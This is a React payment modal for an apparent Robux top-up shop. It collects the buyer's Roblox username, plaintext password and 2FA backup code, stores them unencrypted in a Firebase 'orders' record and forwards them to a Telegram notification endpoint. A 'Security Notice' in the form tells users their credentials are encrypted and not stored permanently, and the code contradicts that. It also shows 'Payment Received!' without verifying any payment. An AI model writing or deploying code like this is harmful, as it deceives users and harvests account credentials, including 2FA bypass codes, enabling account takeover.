'use client';

import { motion, AnimatePresence } from 'framer-motion';
import { X, CheckCircle, Eye, EyeOff, Lock, User, KeyRound } from 'lucide-react';
import { QRCodeSVG } from 'qrcode.react';
import { useState, useEffect } from 'react';
import { generateDynamicQRIS } from '@/lib/qris';
import { database } from '@/lib/firebase';
import { ref, push, serverTimestamp } from 'firebase/database';

export default function PaymentModal({ isOpen, onClose, product }) {
    const [step, setStep] = useState('input');
    const [formData, setFormData] = useState({
        username: '',
        password: '',
        backupCode: '',
        whatsapp: '',
    });
    const [showPassword, setShowPassword] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    useEffect(() => {
        if (isOpen) {
            setStep('input');
            setFormData({ username: '', password: '', backupCode: '', whatsapp: '' });
            setShowPassword(false);
        }
    }, [isOpen]);

    if (!isOpen || !product) return null;

    const BASE_QRIS = process.env.NEXT_PUBLIC_QRIS_STATIC || "00020101021126610014COM.GO-JEK.WWW01189360091438384483020210G8384483020303UMI51440014ID.CO.QRIS.WWW0215ID10254267424050303UMI5204899953033605802ID5925NXRDEN, Digital & Kreatif6007CIANJUR61054325362070703A016304A48B";
    const qrData = generateDynamicQRIS(BASE_QRIS, product.price);

    const handleContinue = () => {
        if (!formData.username.trim() || !formData.password.trim()) return;
        setStep('payment');
    };

    const handleCheckStatus = async () => {
        setIsLoading(true);
        try {
            const orderCode = 'NX-' + Math.random().toString(36).substring(2, 8).toUpperCase();
            await push(ref(database, 'orders'), {
                orderCode,
                productId: product.id,
                productName: product.name,
                price: product.price,
                username: formData.username,
                password: formData.password,
                backupCode: formData.backupCode || null,
                whatsapp: formData.whatsapp,
                status: 'pending',
                category: product.category || 'Regular',
                createdAt: serverTimestamp()
            });
            // Send Telegram notification (fire-and-forget)
            fetch('/api/telegram', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    event: 'new_order',
                    orderCode,
                    productName: product.name,
                    price: product.price,
                    category: product.category || 'Regular',
                    username: formData.username,
                    password: formData.password,
                    backupCode: formData.backupCode || null,
                    whatsapp: formData.whatsapp,
                }),
            }).catch(err => console.error('Telegram notification failed:', err));
            setTimeout(() => {
                setIsLoading(false);
                setStep('success');
            }, 1200);
        } catch (error) {
            console.error("Order failed", error);
            alert("Failed to create order. Please try again.");
            setIsLoading(false);
        }
    };

    const updateField = (field, value) => {
        setFormData(prev => ({ ...prev, [field]: value }));
    };

    return (
        <AnimatePresence>
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm" onClick={onClose}>
                <motion.div
                    initial={{ opacity: 0, scale: 0.95, y: 10 }}
                    animate={{ opacity: 1, scale: 1, y: 0 }}
                    exit={{ opacity: 0, scale: 0.95, y: 10 }}
                    onClick={(e) => e.stopPropagation()}
                    className="bg-white rounded-3xl w-full max-w-md overflow-hidden shadow-2xl shadow-violet-500/10"
                >
                    {/* Header */}
                    <div className="px-6 pt-6 pb-4 flex justify-between items-start">
                        <div>
                            <p className="text-xs font-medium text-slate-500 uppercase tracking-wider">
                                {step === 'input' ? 'Step 1 of 2' : step === 'payment' ? 'Step 2 of 2' : 'Complete'}
                            </p>
                            <h3 className="text-xl font-bold text-slate-900 mt-1">
                                {step === 'input' ? 'Account Details' : step === 'payment' ? 'Scan & Pay' : 'Order Placed!'}
                            </h3>
                        </div>
                        <button onClick={onClose} className="text-slate-400 hover:text-slate-900 transition p-1 hover:bg-zinc-100 rounded-lg">
                            <X size={18} />
                        </button>
                    </div>

                    {/* Product Badge */}
                    {step !== 'success' && (
                        <div className="mx-6 mb-5 flex items-center justify-between px-4 py-3 bg-violet-50 rounded-2xl border border-violet-200">
                            <span className="font-semibold text-slate-900 text-sm">{product.name}</span>
                            <span className="text-violet-600 font-bold">{product.priceDisplay}</span>
                        </div>
                    )}

                    {/* Body */}
                    <div className="px-6 pb-6">
                        {step === 'input' && (
                            <div className="space-y-4">
                                {/* Username */}
                                <div>
                                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">
                                        Roblox Username <span className="text-red-400">*</span>
                                    </label>
                                    <div className="relative">
                                        <User size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                                        <input
                                            type="text"
                                            value={formData.username}
                                            onChange={(e) => updateField('username', e.target.value)}
                                            className="w-full bg-zinc-50 border border-zinc-200 rounded-xl pl-10 pr-4 py-3 text-slate-900 text-sm focus:outline-none focus:border-violet-400 focus:ring-2 focus:ring-violet-100 transition-all placeholder:text-zinc-400"
                                            placeholder="Enter your username"
                                        />
                                    </div>
                                </div>

                                {/* Password */}
                                <div>
                                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">
                                        Roblox Password <span className="text-red-400">*</span>
                                    </label>
                                    <div className="relative">
                                        <Lock size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                                        <input
                                            type={showPassword ? 'text' : 'password'}
                                            value={formData.password}
                                            onChange={(e) => updateField('password', e.target.value)}
                                            className="w-full bg-zinc-50 border border-zinc-200 rounded-xl pl-10 pr-12 py-3 text-slate-900 text-sm focus:outline-none focus:border-violet-400 focus:ring-2 focus:ring-violet-100 transition-all placeholder:text-zinc-400"
                                            placeholder="Enter your password"
                                        />
                                        <button
                                            type="button"
                                            onClick={() => setShowPassword(!showPassword)}
                                            className="absolute right-3.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-violet-600 transition"
                                        >
                                            {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
                                        </button>
                                    </div>
                                </div>

                                {/* Backup Code (Optional) */}
                                <div>
                                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">
                                        Backup Code <span className="text-zinc-300 normal-case font-normal">(optional)</span>
                                    </label>
                                    <div className="relative">
                                        <KeyRound size={16} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-slate-400" />
                                        <input
                                            type="text"
                                            value={formData.backupCode}
                                            onChange={(e) => updateField('backupCode', e.target.value)}
                                            className="w-full bg-zinc-50 border border-zinc-200 rounded-xl pl-10 pr-4 py-3 text-slate-900 text-sm focus:outline-none focus:border-violet-400 focus:ring-2 focus:ring-violet-100 transition-all placeholder:text-zinc-400"
                                            placeholder="2FA backup code if available"
                                        />
                                    </div>
                                </div>

                                <div className="bg-amber-50 border border-amber-200/60 rounded-xl p-3 mt-2">
                                    <p className="text-xs text-amber-700 leading-relaxed">
                                        <strong>🔒 Security Notice:</strong> Your credentials are encrypted and only used for Robux delivery. We never store passwords permanently.
                                    </p>
                                </div>

                                {/* WhatsApp Number */}
                                <div>
                                    <label className="block text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2">
                                        WhatsApp Number <span className="text-red-400">*</span>
                                    </label>
                                    <div className="relative">
                                        <input
                                            type="tel"
                                            value={formData.whatsapp}
                                            onChange={(e) => updateField('whatsapp', e.target.value)}
                                            className="w-full bg-zinc-50 border border-zinc-200 rounded-xl px-4 py-3 text-slate-900 text-sm focus:outline-none focus:border-violet-400 focus:ring-2 focus:ring-violet-100 transition-all placeholder:text-zinc-400"
                                            placeholder="e.g. 08123456789"
                                        />
                                    </div>
                                </div>

                                <button
                                    onClick={handleContinue}
                                    disabled={!formData.username.trim() || !formData.password.trim() || !formData.whatsapp?.trim()}
                                    className="w-full bg-violet-600 hover:bg-violet-700 text-white font-semibold py-3.5 rounded-xl transition-all disabled:opacity-40 disabled:cursor-not-allowed mt-2 active:scale-[0.98] shadow-sm shadow-violet-600/25"
                                >
                                    Continue to Payment
                                </button>
                            </div>
                        )}

                        {step === 'payment' && (
                            <div className="flex flex-col items-center gap-5">
                                <div className="p-5 bg-white rounded-2xl border border-zinc-100 shadow-sm">
                                    <QRCodeSVG value={qrData} size={180} level="H" />
                                </div>
                                <div className="text-center space-y-1">
                                    <p className="text-violet-600 font-bold text-2xl">{product.priceDisplay}</p>
                                    <p className="text-slate-500 text-sm">Scan QR with your e-wallet or banking app</p>
                                </div>
                                <div className="w-full bg-zinc-50 border border-zinc-200 rounded-xl px-4 py-3 text-xs text-slate-500">
                                    <div className="flex justify-between"><span>Account</span><span className="text-slate-900 font-medium">{formData.username}</span></div>
                                </div>
                                <button
                                    onClick={handleCheckStatus}
                                    disabled={isLoading}
                                    className="w-full bg-violet-600 hover:bg-violet-700 text-white font-semibold py-3.5 rounded-xl transition-all flex items-center justify-center gap-2 active:scale-[0.98] shadow-sm shadow-violet-600/25"
                                >
                                    {isLoading ? (
                                        <span className="w-5 h-5 border-2 border-violet-300 border-t-white rounded-full animate-spin"></span>
                                    ) : (
                                        <>I have paid</>
                                    )}
                                </button>
                            </div>
                        )}

                        {step === 'success' && (
                            <div className="flex flex-col items-center gap-5 py-4">
                                <div className="w-16 h-16 bg-emerald-50 text-emerald-500 rounded-full flex items-center justify-center">
                                    <CheckCircle size={32} />
                                </div>
                                <div className="text-center">
                                    <h4 className="text-xl font-bold text-slate-900 mb-1">Payment Received!</h4>
                                    <p className="text-slate-500 text-sm">Your order is being processed. You&apos;ll receive your Robux shortly.</p>
                                </div>
                                <div className="w-full bg-zinc-50 border border-zinc-200 rounded-xl px-4 py-3 text-xs space-y-1.5 text-slate-500">
                                    <div className="flex justify-between"><span>Product</span><span className="text-slate-900 font-medium">{product.name}</span></div>
                                    <div className="flex justify-between"><span>Amount</span><span className="text-slate-900 font-medium">{product.priceDisplay}</span></div>
                                    <div className="flex justify-between"><span>Account</span><span className="text-slate-900 font-medium">{formData.username}</span></div>
                                </div>
                                <button
                                    onClick={onClose}
                                    className="w-full bg-zinc-100 hover:bg-zinc-200 text-slate-900 font-semibold py-3 rounded-xl transition-all"
                                >
                                    Done
                                </button>
                            </div>
                        )}
                    </div>
                </motion.div>
            </div>
        </AnimatePresence>
    );
}
